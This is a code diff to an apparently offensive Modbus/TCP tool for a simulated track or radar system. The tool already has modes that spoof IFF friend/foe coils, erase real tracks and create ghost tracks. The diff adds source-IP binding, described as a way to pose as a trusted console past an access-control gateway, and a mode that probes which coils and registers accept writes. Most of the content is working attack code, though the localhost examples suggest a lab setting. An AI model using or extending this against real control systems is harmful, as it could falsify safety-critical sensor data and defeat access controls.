@@ -20,12 +20,19 @@
 #include <chrono>
 #include <thread>
 #include <algorithm>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
 
 namespace {
 
 void usage(const char *prog) {
     fprintf(stderr,
-        "Usage: %s <host> <port> <mode> [args...]\n\n"
+        "Usage: %s [--bind-ip <ip>] <host> <port> <mode> [args...]\n\n"
+        "  --bind-ip <ip>   Connect from a specific local source IP (e.g. to\n"
+        "                    present as the trusted console at 127.0.0.2 against\n"
+        "                    a Level 2 access-control gateway)\n\n"
         "Modes:\n"
         "  enumerate                     Dump all coils / holding regs / input regs\n"
         "  spoof-iff <track 0-3> <0|1>   Flip IFF friend/foe coil for a track\n"
@@ -34,23 +41,60 @@ void usage(const char *prog) {
         "  kill-track <track 0-3>        Clear TRACK_ACTIVE coil (erase a real track)\n"
         "  ghost-track <track 0-3>       Set TRACK_ACTIVE + IFF friend with no sensor basis\n"
         "  fuzz <iterations>              Send malformed/edge-case function code requests\n"
+        "  probe-acl                      Map out an access-control gateway's write\n"
+        "                                 policy by testing a range of addresses\n"
         "  (replay mode: planned, see README roadmap — not yet implemented)\n"
         "\nExample:\n"
         "  %s 127.0.0.1 15020 enumerate\n"
-        "  %s 127.0.0.1 15020 spoof-iff 1 1\n",
-        prog, prog, prog);
+        "  %s 127.0.0.1 15021 probe-acl\n"
+        "  %s --bind-ip 127.0.0.2 127.0.0.1 15021 spoof-iff 1 1\n",
+        prog, prog, prog, prog);
 }
 
-modbus_t *connect_target(const char *host, int port) {
+modbus_t *connect_target(const char *host, int port, const char *bind_ip) {
     modbus_t *ctx = modbus_new_tcp(host, port);
     if (!ctx) {
         fprintf(stderr, "[-] Failed to create context\n");
         return nullptr;
     }
-    if (modbus_connect(ctx) == -1) {
-        fprintf(stderr, "[-] Connection failed: %s\n", modbus_strerror(errno));
-        modbus_free(ctx);
-        return nullptr;
+
+    if (bind_ip) {
+        // Manually create, bind, and connect the socket so the connection
+        // originates from a chosen local IP, then hand it to libmodbus.
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) {
+            fprintf(stderr, "[-] socket() failed\n");
+            modbus_free(ctx);
+            return nullptr;
+        }
+        struct sockaddr_in local{};
+        local.sin_family = AF_INET;
+        local.sin_port = 0; // any local port
+        inet_pton(AF_INET, bind_ip, &local.sin_addr);
+        if (bind(sock, (struct sockaddr *)&local, sizeof(local)) < 0) {
+            fprintf(stderr, "[-] bind() to %s failed: %s\n", bind_ip, strerror(errno));
+            close(sock);
+            modbus_free(ctx);
+            return nullptr;
+        }
+        struct sockaddr_in remote{};
+        remote.sin_family = AF_INET;
+        remote.sin_port = htons(port);
+        inet_pton(AF_INET, host, &remote.sin_addr);
+        if (connect(sock, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
+            fprintf(stderr, "[-] connect() from %s failed: %s\n", bind_ip, strerror(errno));
+            close(sock);
+            modbus_free(ctx);
+            return nullptr;
+        }
+        modbus_set_socket(ctx, sock);
+        printf("[*] Connected to %s:%d from source IP %s\n", host, port, bind_ip);
+    } else {
+        if (modbus_connect(ctx) == -1) {
+            fprintf(stderr, "[-] Connection failed: %s\n", modbus_strerror(errno));
+            modbus_free(ctx);
+            return nullptr;
+        }
     }
     return ctx;
 }
@@ -144,6 +188,44 @@ int mode_ghost_track(modbus_t *ctx, int track) {
     return 0;
 }
 
+const char *classify_write_result(int rc) {
+    if (rc != -1) return "ALLOWED";
+    if (errno == EMBXILFUN) return "DENIED (illegal function — likely untrusted source IP)";
+    if (errno == EMBXILADD) return "DENIED (illegal data address — out of the writable range)";
+    return "DENIED (other error)";
+}
+
+int mode_probe_acl(modbus_t *ctx) {
+    printf("[*] Probing write access across a spread of coils/registers.\n");
+    printf("[*] This does not bypass an access-control gateway — it maps out\n");
+    printf("    which addresses/functions this connection is allowed to touch.\n\n");
+
+    struct Probe { const char *label; bool is_coil; int addr; };
+    std::vector<Probe> probes = {
+        {"coil 0  (TRACK1_ACTIVE)",      true,  0},
+        {"coil 9  (IFF_TRACK2_FRIEND)",  true,  9},
+        {"coil 16 (OPERATOR_LOCKOUT)",   true,  16},
+        {"coil 17 (ALARM_SILENCED)",     true,  17},
+        {"reg 0   (TRACK1_BEARING)",     false, 0},
+        {"reg 12  (TRACK4_BEARING)",     false, 12},
+        {"reg 100 (SYSTEM_MODE)",        false, 100},
+        {"reg 101 (WATCHDOG_COUNTER)",   false, 101},
+    };
+
+    for (const auto &p : probes) {
+        int rc = p.is_coil
+            ? modbus_write_bit(ctx, p.addr, 1)
+            : modbus_write_register(ctx, p.addr, 12345);
+        printf("  %-30s -> %s\n", p.label, classify_write_result(rc));
+    }
+
+    printf("\n[*] Reads remain open under this policy regardless of the above:\n");
+    uint16_t one_reg;
+    printf("    read holding_reg[0] -> %s\n",
+           modbus_read_registers(ctx, 0, 1, &one_reg) != -1 ? "ALLOWED" : "DENIED");
+    return 0;
+}
+
 int mode_fuzz(modbus_t *ctx, int iterations) {
     printf("[*] Sending %d malformed/edge-case function-code requests...\n", iterations);
     int errors = 0, unexpected_ok = 0;
@@ -190,28 +272,40 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    const char *host = argv[1];
-    int port = atoi(argv[2]);
-    std::string mode = argv[3];
+    // Optional leading "--bind-ip <ip>" flag shifts the remaining positional args.
+    const char *bind_ip = nullptr;
+    int arg_offset = 1;
+    if (std::string(argv[1]) == "--bind-ip") {
+        if (argc < 6) { usage(argv[0]); return 1; }
+        bind_ip = argv[2];
+        arg_offset = 3;
+    }
 
-    modbus_t *ctx = connect_target(host, port);
+    const char *host = argv[arg_offset];
+    int port = atoi(argv[arg_offset + 1]);
+    std::string mode = argv[arg_offset + 2];
+    int a = arg_offset + 3; // index of the first mode-specific argument
+
+    modbus_t *ctx = connect_target(host, port, bind_ip);
     if (!ctx) return 1;
 
     int rc = 0;
 
     if (mode == "enumerate") {
         rc = mode_enumerate(ctx);
-    } else if (mode == "spoof-iff" && argc >= 6) {
-        rc = mode_spoof_iff(ctx, atoi(argv[4]), atoi(argv[5]));
-    } else if (mode == "spoof-track" && argc >= 9) {
-        rc = mode_spoof_track(ctx, atoi(argv[4]), atoi(argv[5]), atoi(argv[6]), atoi(argv[7]), atoi(argv[8]));
-    } else if (mode == "kill-track" && argc >= 5) {
-        rc = mode_kill_track(ctx, atoi(argv[4]));
-    } else if (mode == "ghost-track" && argc >= 5) {
-        rc = mode_ghost_track(ctx, atoi(argv[4]));
+    } else if (mode == "spoof-iff" && argc >= a + 2) {
+        rc = mode_spoof_iff(ctx, atoi(argv[a]), atoi(argv[a + 1]));
+    } else if (mode == "spoof-track" && argc >= a + 5) {
+        rc = mode_spoof_track(ctx, atoi(argv[a]), atoi(argv[a + 1]), atoi(argv[a + 2]), atoi(argv[a + 3]), atoi(argv[a + 4]));
+    } else if (mode == "kill-track" && argc >= a + 1) {
+        rc = mode_kill_track(ctx, atoi(argv[a]));
+    } else if (mode == "ghost-track" && argc >= a + 1) {
+        rc = mode_ghost_track(ctx, atoi(argv[a]));
     } else if (mode == "fuzz") {
-        int iters = (argc >= 5) ? atoi(argv[4]) : 200;
+        int iters = (argc >= a + 1) ? atoi(argv[a]) : 200;
         rc = mode_fuzz(ctx, iters);
+    } else if (mode == "probe-acl") {
+        rc = mode_probe_acl(ctx);
     } else {
         usage(argv[0]);
         rc = 1;
